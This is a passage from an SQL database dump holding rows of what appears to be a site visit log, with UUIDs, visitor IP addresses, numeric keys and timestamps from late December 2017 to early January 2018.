08:22:12','2017-12-31 08:22:12',NULL),(219,'e13259db-6974-4d8f-96ec-a7b89288b305',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:16','2017-12-31 08:22:16',NULL),(220,'8337e1b9-fd10-4578-a799-b8e72a7fa63a',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:19','2017-12-31 08:22:19',NULL),(221,'082ec9b2-e7b6-445c-8f36-ce7818707309',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:22','2017-12-31 08:22:22',NULL),(222,'fec779d2-37a6-4dc8-a6ca-771d205beb29',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:25','2017-12-31 08:22:25',NULL),(223,'105420ff-05d1-4194-8b83-310e680486e6',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:28','2017-12-31 08:22:28',NULL),(224,'80a285a1-8b1c-4d10-9ad5-03eb0ca813d4',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:31','2017-12-31 08:22:31',NULL),(225,'00dbe327-46f1-44a9-b62a-f06089f685df',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:35','2017-12-31 08:22:35',NULL),(226,'e9525849-a7f5-4f6f-ae74-7dffe0457535',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:39','2017-12-31 08:22:39',NULL),(227,'e53b0cb2-ba0e-4573-878c-6262d65def0b',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:42','2017-12-31 08:22:42',NULL),(228,'ba7aca0f-16be-4345-a9ba-964cd6fef98a',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:46','2017-12-31 08:22:46',NULL),(229,'052cfe53-01b4-4acd-ba8b-81463a896fbd',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:48','2017-12-31 08:22:48',NULL),(230,'59951ddb-d2c2-4b90-9404-f9829a556114',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:55','2017-12-31 08:22:55',NULL),(231,'75d36eaf-442a-4320-aeb0-01a039eb1905',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:58','2017-12-31 08:22:58',NULL),(232,'2bc9a10e-bb6c-4a70-a8fc-7d35999ebeb7',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:23:02','2017-12-31 08:23:02',NULL),(233,'991fe951-8a4f-4b6b-8a86-7dfd0cdeddb1',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:23:04','2017-12-31 08:23:04',NULL),(234,'64264fb8-46fe-4d53-be27-66fd8f6e5917',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:23:07','2017-12-31 08:23:07',NULL),(235,'ba8d9df8-b6c2-41ae-a6ab-087bd9176c13',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:23:10','2017-12-31 08:23:10',NULL),(236,'2d843ac1-4e0d-4f82-8e82-201b6fb5daac',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:23:13','2017-12-31 08:23:13',NULL),(237,'06e0b53d-48da-4d9a-9753-d4d9a31289b2',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:23:18','2017-12-31 08:23:18',NULL),(238,'2728f36b-ab50-4da6-952a-db3e44de89c5',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:23:36','2017-12-31 08:23:36',NULL),(239,'35471fae-f7aa-4330-b549-d77c0b372ba7',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:23:40','2017-12-31 08:23:40',NULL),(240,'3b935590-08dc-4a35-89dc-d8b402d60eea',NULL,5,17,'213.180.203.59',NULL,NULL,NULL,1,'2017-12-31 08:54:52','2017-12-31 08:54:52',NULL),(241,'3479785d-1b8a-4668-8d6d-d236ccae3332',NULL,5,17,'178.154.200.18',NULL,NULL,NULL,1,'2017-12-31 08:57:15','2017-12-31 08:57:15',NULL),(242,'04d90594-593f-4edb-a2c2-776bf0d0611e',NULL,5,44,'74.115.214.138',23,NULL,NULL,1,'2017-12-31 09:37:58','2017-12-31 09:37:58',NULL),(243,'09a3f68d-bbde-4166-a7ad-9f322019586e',NULL,23,56,'195.123.211.202',11,NULL,NULL,0,'2017-12-31 13:13:45','2017-12-31 09:43:45',NULL),(244,'bb902f67-eedd-41d9-9aec-ef246488be15',NULL,1,1,'31.47.32.230',21,NULL,NULL,0,'2017-12-31 13:27:40','2017-12-31 09:57:40',NULL),(245,'fd8e9607-0354-4ec1-97c6-fb880d105961',NULL,12,19,'66.249.93.88',NULL,NULL,NULL,1,'2017-12-31 10:15:06','2017-12-31 10:15:06',NULL),(246,'51071ef5-e680-4ccf-a661-74adff767753',NULL,20,50,'5.112.95.160',NULL,NULL,NULL,0,'2017-12-31 11:41:12','2017-12-31 11:41:12',NULL),(247,'4ba39834-9788-4e09-b6ad-b08939575a88',NULL,5,46,'216.244.66.226',NULL,NULL,NULL,1,'2017-12-31 11:49:51','2017-12-31 11:49:51',NULL),(248,'4620e347-effc-42d1-93de-c31c0a83330d',NULL,5,16,'220.181.108.79',NULL,NULL,NULL,1,'2017-12-31 11:50:08','2017-12-31 11:50:08',NULL),(249,'92af2125-b003-4510-8ebc-67c65b9ec667',NULL,9,11,'42.236.12.190',12,NULL,NULL,1,'2017-12-31 15:03:48','2017-12-31 15:03:48',NULL),(250,'a3b42833-4f1d-4bfd-a701-188df192432c',NULL,9,11,'42.236.99.79',11,NULL,NULL,1,'2017-12-31 15:04:18','2017-12-31 15:04:18',NULL),(251,'d38d6b68-2027-44a8-851d-fb19ab8350ea',NULL,5,44,'172.241.151.27',28,NULL,NULL,1,'2017-12-31 16:48:09','2017-12-31 16:48:09',NULL),(252,'a637fa97-79d5-48f1-90b0-daa2491a8810',NULL,5,2,'62.138.2.243',NULL,NULL,NULL,1,'2017-12-31 16:56:56','2017-12-31 16:56:56',NULL),(253,'ffbe7ca7-8c95-4d44-87b9-7ab61c1c9295',NULL,5,2,'62.138.2.243',NULL,NULL,NULL,1,'2017-12-31 17:45:07','2017-12-31 17:45:07',NULL),(254,'b6f79abe-6fb5-4970-9656-fd4e0ce2af5e',NULL,5,44,'74.115.214.143',24,NULL,NULL,1,'2017-12-31 18:30:02','2017-12-31 18:30:02',NULL),(255,'9a70ad7d-3e6f-4606-9980-2108cd409638',NULL,5,57,'84.95.87.84',NULL,NULL,NULL,0,'2017-12-31 19:12:25','2017-12-31 19:12:25',NULL),(256,'8a0b1274-e58e-434f-a144-780fba223e00',NULL,5,44,'74.115.214.146',23,NULL,NULL,1,'2017-12-31 19:26:47','2017-12-31 19:26:47',NULL),(257,'09c5a607-937c-418f-8f86-5ce2452252e5',NULL,9,12,'42.236.10.74',11,NULL,NULL,1,'2017-12-31 21:48:59','2017-12-31 21:48:59',NULL),(258,'4ed6dfeb-791c-4e83-ba08-207ac2feb261',NULL,5,58,'31.184.133.101',12,NULL,NULL,1,'2017-12-31 22:28:09','2017-12-31 22:28:09',NULL),(259,'16761f9c-798d-4ee7-a576-851443fe34d3',NULL,5,59,'212.71.255.191',NULL,NULL,NULL,1,'2018-01-01 02:01:21','2018-01-01 02:01:21',NULL),(260,'d8941430-1d41-41ed-8253-a7fee05ed2fa',NULL,5,60,'65.132.59.34',NULL,NULL,NULL,1,'2018-01-01 02:04:39','2018-01-01 02:04:39',NULL),(261,'51334538-29b7-4e4f-a279-e181776aecbd',NULL,5,3,'213.133.111.165',NULL,NULL,NULL,1,'2018-01-01 02:18:24','2018-01-01 02:18:24',NULL),(262,'5ae34e6a-235a-4028-9388-49345d1c6564',NULL,5,3,'213.133.111.165',NULL,NULL,NULL,1,'2018-01-01 02:18:26','2018-01-01 02:18:26',NULL),(263,'f4a6a6c0-0589-4cc9-b733-070b2bdcbd97',NULL,5,3,'213.133.111.165',NULL,NULL,NULL,1,'2018-01-01 02:18:30','2018-01-01 02:18:30',NULL),(264,'1ec07ef0-c235-432c-8e44-bc80b870bb76',NULL,12,19,'66.249.93.90',NULL,NULL,NULL,1,'2018-01-01 02:44:21','2018-01-01 02:44:21',NULL),(265,'4b642858-2dd2-4b47-b12f-3c3f11515cfd',NULL,6,9,'85.99.74.105',NULL,NULL,NULL,0,'2018-01-01 03:17:19','2018-01-01 03:17:19',NULL),(266,'557533be-e949-4db3-81d2-5d27929c2849',NULL,5,3,'178.151.245.174',NULL,NULL,NULL,1,'2018-01-01 03:49:55','2018-01-01 03:49:55',NULL),(267,'9c099a06-b2e2-423c-91f7-bbb79398b335',NULL,5,3,'178.151.245.174',NULL,NULL,NULL,1,'2018-01-01 03:50:03','2018-01-01 03:50:03',NULL),(268,'185fa54e-09af-4679-8473-1604b8bf29d6',NULL,5,3,'178.151.245.174',NULL,NULL,NULL,1,'2018-01-01 03:50:17','2018-01-01 03:50:17',NULL),(269,'44716703-210a-44bb-9fe4-2f6821e42688',NULL,5,46,'216.244.66.226',NULL,NULL,NULL,1,'2018-01-01 04:03:36','2018-01-01 04:03:36',NULL),(270,'e495c906-13b7-48e8-a59d-1cd190a4707a',NULL,16,61,'204.79.180.1',NULL,NULL,NULL,0,'2018-01-01 04:37:21','2018-01-01 04:37:21',NULL),(271,'35c8ba3d-2fdb-49ed-8fba-d587fe0c96fe',NULL,5,46,'216.244.66.226',NULL,NULL,NULL,1,'2018-01-01 06:39:46','2018-01-01 06:39:46',NULL),(272,'40d5b80e-7f65-4029-881f-8265cdfbf149',NULL,5,62,'109.236.8.10',NULL,NULL,NULL,1,'2018-01-01 09:38:41','2018-01-01 09:38:41',NULL),(273,'dd5b61a1-2b2b-47d4-83c6-61fcffcdc52f',NULL,5,62,'109.236.8.10',NULL,NULL,NULL,1,'2018-01-01 09:38:41','2018-01-01 09:38:41',NULL),(274,'43932f1a-37d0-4387-bc7d-fe09cc28f636',NULL,6,63,'179.255.208.245',NULL,NULL,NULL,0,'2018-01-01 11:07:29','2018-01-01 11:07:29',NULL),(275,'3b9af102-28b0-43e5-bcd4-27e1743304c1',NULL,9,26,'180.153.236.149',11,NULL,NULL,1,'2018-01-01 13:29:09','2018-01-01 13:29:09',NULL),(276,'a1a2b0cd-1698-49ca-9dcb-3854a2a28414',NULL,9,26,'180.153.236.149',12,NULL,NULL,1,'2018-01-01 13:29:09','2018-01-01 13:29:09',NULL),(277,'23961ed1-6707-45c8-a26b-8eba387f1a00',NULL,5,44,'172.241.151.28',24,NULL,NULL,1,'2018-01-01 13:57:06','2018-01-01 13:57:06',NULL),(278,'9f6798fe-acab-4a22-ba70-7d5a2087d4ef',NULL,5,3,'144.76.12.66',NULL,NULL,NULL,1,'2018-01-01 14:24:48','2018-01-01 14:24:48',NULL),(279,'20ea525f-7a91-4d15-b8d2-86b9fc3a25e4',NULL,5,3,'144.76.12.66',NULL,NULL,NULL,1,'2018-01-01 14:24:50','2018-01-01 14:24:50',NULL),(280,'e733eef7-fa14-402a-a3f4-60a05639c28f',NULL,5,3,'144.76.12.66',NULL,NULL,NULL,1,'2018-01-01 14:24:52','2018-01-01 14:24:52',NULL),(281,'6028d33c-6ed1-4d0f-944d-18545ad9b8b6',NULL,5,3,'144.76.12.66',NULL,NULL,NULL,1,'2018-01-01 14:24:56','2018-01-01 14:24:56',NULL),(282,'b0c2c421-389e-4665-a170-8a974f7bd759',NULL,5,3,'144.76.12.66',NULL,NULL,NULL,1,'2018-01-01 14:24:59','2018-01-01 14:24:59',NULL),(283,'2e37ff85-f2f7-4f32-9508-4d856daa66ad',NULL,5,3,'144.76.12.66',NULL,NULL,NULL,1,'2018-01-01 14:25:01','2018-01-01 14:25:01',NULL),(284,'6ae45bcb-2383-4c6d-884c-c7b5656a81c1',NULL,5,3,'162.210.196.130',NULL,NULL,NULL,1,'2018-01-01 14:49:13','2018-01-01 14:49:13',NULL),(285,'acdacb8b-23d3-4719-a861-460001ffc831',NULL,5,13,'68.180.229.155',NULL,NULL,NULL,1,'2018-01-01 15:07:32','2018-01-01 15:07:32',NULL),(286,'b8c72b6d-7a30-40c1-ac84-2b7270096651',NULL,18,64,'66.175.209.124',20,NULL,NULL,0,'2018-01-01 18:59:43','2018-01-01 15:29:43',NULL),(287,'8f057246-110e-469c-bb6d-00d2d7f43850',NULL,5,21,'220.181.125.188',NULL,NULL,NULL,1,'2018-01-01 16:17:26','2018-01-01 16:17:26',NULL),(288,'747ce6e4-2ba5-487e-bc5e-59ea55ed44f2',NULL,19,65,'112.155.42.2',NULL,NULL,NULL,0,'2018-01-01 16:55:30','2018-01-01 16:55:30',NULL),(289,'574d0650-6546-4576-800b-5ec9e87db312',NULL,18,64,'37.63.229.66',NULL,NULL,NULL,0,'2018-01-01 16:55:49','2018-01-01 16:55:49',NULL),(290,'9efae350-b6f6-4524-a6b5-0d84d36e9fa9',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:09:01','2018-01-01 18:09:01',NULL),(291,'f246b8c1-e93f-422b-9eea-297fbfbe79a7',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:09:06','2018-01-01 18:09:06',NULL),(292,'554bcc8b-c571-43e8-8188-ba2d28b2c652',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:09:10','2018-01-01 18:09:10',NULL),(293,'3aaff0ba-13d2-4a0d-b3d1-702d644e5ae8',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:09:23','2018-01-01 18:09:23',NULL),(294,'7195e25b-3442-417b-b81d-caa3614500fc',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:09:30','2018-01-01 18:09:30',NULL),(295,'e32a698a-e002-4219-976a-5bc770ea2cb3',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:09:38','2018-01-01 18:09:38',NULL),(296,'435fc24f-f781-427a-94ab-fb0d50cee6a6',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:09:43','2018-01-01 18:09:43',NULL),(297,'b963f068-3437-4f73-bcca-a750132c47e4',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:09:51','2018-01-01 18:09:51',NULL),(298,'5af99847-606f-4474-b53d-2c6a31dac278',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:09:59','2018-01-01 18:09:59',NULL),(299,'a826a95e-1bd8-4642-a0d6-50c7fbdaeb7a',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:10:12','2018-01-01 18:10:12',NULL),(300,'9d594c88-2ab9-4062-929c-a5c2ccea0403',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:10:23','2018-01-01 18:10:23',NULL),(301,'708b5ad7-c37c-4018-b333-cfbd56948a52',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:10:34','2018-01-01 18:10:34',NULL),(302,'00f257a7-82de-4887-aa3f-2062fa831d98',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:10:45','2018-01-01 18:10:45',NULL),(303,'ffcc5f21-44a4-4b6d-9227-e56baa5adf35',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:10:50','2018-01-01 18:10:50',NULL),(304,'a316e70d-61a2-42f1-9535-87bdd147a44e',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:10:59','2018-01-01 18:10:59',NULL),(305,'cdd2ecde-7526-4cb3-a204-61ee2b87d23e',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:11:06','2018-01-01 18:11:06',NULL),(306,'1a42c0e3-d4c6-49c0-99d1-75b7aa6f1986',NULL,5,2,'192.151.152.98',NULL,NULL,NULL,1,'2018-01-01 18:11:17','2018-01-01 18:11:17',NULL),(307,'c84eee71-4f53-49b9-9222-594726234fcc',NULL,5,66,'116.199.2.197',NULL,NULL,NULL,0,'2018-01-01 18:41:20','2018-01-01 18:41:20',NULL),(308,'9dd609e0-bf1e-4ee6-b3fa-af990bc91f62',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:57:29','2018-01-01 18:57:29',NULL),(309,'1208cd9e-4033-4958-8ac8-c31993b4fea8',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:57:39','2018-01-01 18:57:39',NULL),(310,'6fd800f7-6461-409b-a47c-b7ceba93cfc9',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:57:49','2018-01-01 18:57:49',NULL),(311,'debe95f5-2996-4c4b-b79e-a85707859d92',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:58:00','2018-01-01 18:58:00',NULL),(312,'b6fbcffb-a7f3-4931-8112-d05f9d9c5efb',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:58:10','2018-01-01 18:58:10',NULL),(313,'38186667-b8dd-40d1-9e36-ca3b3bfdc291',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:58:34','2018-01-01 18:58:34',NULL),(314,'1c101ea3-f9c6-448d-b5d8-57150bdbf3c5',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:58:45','2018-01-01 18:58:45',NULL),(315,'96dc192b-663d-43a3-9056-c43d1c28ef6a',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:58:56','2018-01-01 18:58:56',NULL),(316,'5816468c-5249-46ea-8942-d8bc820389f7',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:59:08','2018-01-01 18:59:08',NULL),(317,'512f5873-57af-472c-86aa-bec489c5ce98',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:59:19','2018-01-01 18:59:19',NULL),(318,'609e8b9f-9517-446d-a116-e1a578a08b37',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:59:28','2018-01-01 18:59:28',NULL),(319,'11c5a554-a5da-4847-bce6-6247c6e82697',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:59:39','2018-01-01 18:59:39',NULL),(320,'91e54bcb-92e1-406b-aad4-e074d0ff211c',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:59:51','2018-01-01 18:59:51',NULL),(321,'6dc82f32-914a-40e5-aaf3-e475cb541b70',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 18:59:59','2018-01-01 18:59:59',NULL),(322,'d58dd99d-91d4-4cae-a7a7-6b7967069764',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:00:08','2018-01-01 19:00:08',NULL),(323,'e274eee5-f881-48bf-b9ad-bd3522ab0c57',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:00:17','2018-01-01 19:00:17',NULL),(324,'cb109c95-08f2-43bb-a452-8c828db3d6f9',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:00:29','2018-01-01 19:00:29',NULL),(325,'b48f06bf-9076-45f1-ac1e-e086b7d1dbae',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:00:38','2018-01-01 19:00:38',NULL),(326,'7381c3a2-3c79-4a5d-a735-4663aecad199',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:00:50','2018-01-01 19:00:50',NULL),(327,'4e111f8a-5481-4e90-b045-a6debad1fef5',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:01:02','2018-01-01 19:01:02',NULL),(328,'65561bdd-608f-49e3-98b5-dd16e8960bbc',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:01:11','2018-01-01 19:01:11',NULL),(329,'d0844014-8037-4848-8a75-d58cd9c1f137',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:02:16','2018-01-01 19:02:16',NULL),(330,'cd6d0fef-d751-4c7b-a00c-664d33668f60',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:02:24','2018-01-01 19:02:24',NULL),(331,'5c49c8aa-7238-4986-a268-c986dd2af03f',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:02:36','2018-01-01 19:02:36',NULL),(332,'343bd8cb-75d1-4565-b7aa-030e89b24803',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:02:50','2018-01-01 19:02:50',NULL),(333,'bd56e2d1-0522-40ed-a1f0-ecdf4e348375',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:03:03','2018-01-01 19:03:03',NULL),(334,'15542757-c1ff-4be4-989b-92d3d4652ab1',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:03:14','2018-01-01 19:03:14',NULL),(335,'dd070070-d0a1-48b9-a038-5541a9e3e9fd',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:03:24','2018-01-01 19:03:24',NULL),(336,'216b90ae-f066-4691-ae6b-eb79da8edb64',NULL,5,67,'94.199.151.22',NULL,NULL,NULL,1,'2018-01-01 19:04:41','2018-01-01 19:04:41',NULL),(337,'88361de2-1cf4-45ce-80e6-ad7dbf140f9e',NULL,5,44,'172.241.151.29',23,NULL,NULL,1,'2018-01-01 22:23:24','2018-01-01 22:23:24',NULL),(338,'0ba34a87-1931-45d3-8a8a-ef7355f27b4a',NULL,5,3,'79.143.185.25',NULL,NULL,NULL,1,'2018-01-01 23:23:29','2018-01-01 23:23:29',NULL),(339,'49290985-85dd-4842-a48c-7ea761fafaeb',NULL,5,3,'79.143.185.25',NULL,NULL,NULL,1,'2018-01-01 23:23:51','2018-01-01 23:23:51',NULL),(340,'59c63ab8-43e7-4cad-bbe0-6d45f30de95d',NULL,5,17,'37.9.113.62',NULL,NULL,NULL,1,'2018-01-01 23:42:15','2018-01-01 23:42:15',NULL),(341,'d22a4e25-ddc7-4bb7-aa2a-867fa8e4ada7',NULL,5,17,'37.9.113.184',NULL,NULL,NULL,1,'2018-01-01 23:42:16','2018-01-01 23:42:16',NULL),(342,'fdbd235f-98f2-477b-bf8b-32ad782f493b',NULL,8,68,'217.69.143.65',NULL,NULL,NULL,1,'2018-01-02 01:01:07','2018-01-02 01:01:07',NULL),(343,'5e89e6b4-d7d3-4376-8d42-f831cf8c9463',NULL,9,11,'42.236.99.9',11,NULL,NULL,1,'2018-01-02 01:06:54','2018-01-02 01:06:54',NULL),(344,'fd791fef-a4c8-4c1a-a76e-22ee45d4e24a',NULL,9,11,'42.236.99.218',12,NULL,NULL,1,'2018-01-02 01:08:19','2018-01-02 01:08:19',NULL),(345,'743aee28-c446-4aa3-93bd-941c2b47965a',NULL,12,19,'66.249.93.90',NULL,NULL,NULL,1,'2018-01-02 02:41:59','2018-01-02 02:41:59',NULL),(346,'51bc4c24-0e70-4f31-acaf-e665f8f543f6',NULL,5,18,'157.55.39.219',NULL,NULL,NULL,1,'2018-01-02 04:06:15','2018-01-02 04:06:15',NULL),(347,'c71f091a-d6cf-4852-83eb-04bc2430fb39',NULL,9,69,'94.183.161.154',NULL,NULL,NULL,0,'2018-01-02 05:35:08','2018-01-02 05:35:08',NULL),(348,'a9ca031e-ca84-4065-88f6-a659f6f7ade5',NULL,5,3,'69.30.226.234',NULL,NULL,NULL,1,'2018-01-02 06:06:22','2018-01-02 06:06:22',NULL),(349,'1190747d-cd73-452b-b922-adb2adc3a857',NULL,5,18,'207.46.13.150',NULL,NULL,NULL,1,'2018-01-02 06:48:58','2018-01-02 06:48:58',NULL),(350,'8a1502f8-e665-4722-8e86-2faba75e8ab9',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:11:40','2018-01-02 07:11:40',NULL),(351,'6927aa5e-a702-41f9-b49d-6f361743ffc7',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:23:38','2018-01-02 07:23:38',NULL),(352,'a22fcd56-9bf6-46e3-8b58-22105f4caf16',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:23:40','2018-01-02 07:23:40',NULL),(353,'0b5e9d3c-a708-48b3-840f-2e30b71ecf84',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:23:43','2018-01-02 07:23:43',NULL),(354,'f5ac2274-2d0b-4c84-9463-fae37588a460',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:23:46','2018-01-02 07:23:46',NULL),(355,'b1f5db8d-d8a9-45e8-80d3-150e1cc26dfe',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:23:48','2018-01-02 07:23:48',NULL),(356,'5dd93e1e-44d1-4ae0-9f2e-facebe958685',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:23:50','2018-01-02 07:23:50',NULL),(357,'08b88c42-0473-4318-8391-5bb1e3834321',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:23:53','2018-01-02 07:23:53',NULL),(358,'2679b0d5-c098-484e-aa36-7584114cabed',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:23:55','2018-01-02 07:23:55',NULL),(359,'e195af21-7659-4879-a4d4-110ad926bd7d',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:23:58','2018-01-02 07:23:58',NULL),(360,'4308cc2d-abaa-40a2-bfad-5151b6c38a72',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:24:00','2018-01-02 07:24:00',NULL),(361,'59f7d6ab-f00b-4087-a6ce-5f22a4cc7378',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:24:03','2018-01-02 07:24:03',NULL),(362,'33a3e8e0-e4e8-4af6-88f8-244a255337b4',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:24:06','2018-01-02 07:24:06',NULL),(363,'266c3a70-4a84-4d16-8f9e-9cdfaef0e926',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:24:09','2018-01-02 07:24:09',NULL),(364,'32043c50-774a-456e-82da-724cfc11ef20',NULL,5,3,'88.198.55.175',NULL,NULL,NULL,1,'2018-01-02 07:24:11','2018-01-02 07:24:11',NULL),(365,'ceb5e50e-d8d2-4fdb-8e0d-3c9c10d00328',NULL,13,29,'13.56.229.65',NULL,NULL,NULL,0,'2018-01-02 07:28:23','2018-01-02 07:28:23',NULL),(366,'629a9099-587c-4d91-93db-ef38f9056f90',NULL,9,26,'180.153.236.181',12,NULL,NULL,1,'2018-01-02 08:14:49','2018-01-02 08:14:49',NULL),(367,'fd2185a8-d13f-4809-a0b8-f7c1432a17e2',NULL,9,26,'180.153.236.181',11,NULL,NULL,1,'2018-01-02 08:14:49','2018-01-02 08:14:49',NULL),(368,'cd1f9dfa-ffc0-489a-9324-0cd003bac783',NULL,5,46,'216.244.66.226',NULL,NULL,NULL,1,'2018-01-02 10:13:01','2018-01-02 10:13:01',NULL),(369,'19c4855b-b847-4c84-8570-ba70d1c2afcb',NULL,5,44,'74.115.214.131',28,NULL,NULL,1,'2018-01-02 10:19:57','2018-01-02 10:19:57',NULL),(370,'a6133a51-80dc-452c-9009-ecb8eefa7bd4',NULL,5,3,'199.58.86.211',NULL,NULL,NULL,1,'2018-01-02 10:23:40','2018-01-02 10:23:40',NULL),(371,'36aa1441-13f9-4183-97ba-7b633cc6a278',NULL,5,46,'216.244.66.226',NULL,NULL,NULL,1,'2018-01-02 10:43:46','2018-01-02 10:43:46',NULL),(372,'4ac94dad-23d8-4298-95af-0f1fcd61fc3f',NULL,5,3,'107.150.59.98',NULL,NULL,NULL,1,'2018-01-02 11:06:08','2018-01-02 11:06:08',NULL),(373,'5bd07006-887f-4c39-bc7b-bf602fade961',NULL,17,37,'66.249.66.25',NULL,NULL,NULL,1,'2018-01-02 14:13:00','2018-01-02 14:13:00',NULL),(374,'830890b9-d75d-42a1-88ed-9e2cd08cd311',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-02 14:50:05','2018-01-02 14:50:05',NULL),(375,'070a89f9-26a1-4273-b0e5-26b8e91a65e0',NULL,5,44,'74.115.214.135',28,NULL,NULL,1,'2018-01-02 15:15:19','2018-01-02 15:15:19',NULL),(376,'f3e2731e-996f-4339-a71e-a43b73f17b34',NULL,5,44,'74.115.214.153',28,NULL,NULL,1,'2018-01-02 15:31:11','2018-01-02 15:31:11',NULL),(377,'4d871c6e-905b-4f94-9978-0b3538a681ab',NULL,5,44,'74.115.214.148',24,NULL,NULL,1,'2018-01-02 15:55:03','2018-01-02 15:55:03',NULL),(378,'bb39f889-8983-4706-8732-3f7fdea44aa9',NULL,5,3,'142.44.151.76',NULL,NULL,NULL,1,'2018-01-02 17:26:16','2018-01-02 17:26:16',NULL),(379,'81a6301a-b182-4816-a892-b70bcc2a2800',NULL,5,3,'142.44.151.76',NULL,NULL,NULL,1,'2018-01-02 17:26:19','2018-01-02 